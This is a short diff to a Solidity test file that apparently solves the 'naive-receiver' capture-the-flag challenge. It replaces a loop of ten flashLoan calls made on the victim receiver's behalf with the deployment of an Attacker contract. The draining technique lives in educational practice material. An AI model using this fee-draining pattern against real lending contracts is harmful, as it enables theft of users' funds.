@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
 import "../Util.sol";
 import "../../src/naive-receiver/FlashLoanReceiver.sol";
 import "../../src/naive-receiver/NaiveReceiverLenderPool.sol";
-
+import "./Attacker.sol";
 
 contract NaiveReceiverTest is Test{
     uint256 constant ETHER_IN_POOL = 10_000e18;
@@ -44,9 +44,7 @@ contract NaiveReceiverTest is Test{
 
     function testExploit() public{
         /** CODE YOUR SOLUTION HERE */
-        for (uint256 i=0; i<10; i++){
-            pool.flashLoan(receiver, address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),1,"0x");
-        }
+        new Attacker(payable(pool), payable(receiver));
         /* */
         validation();
     }
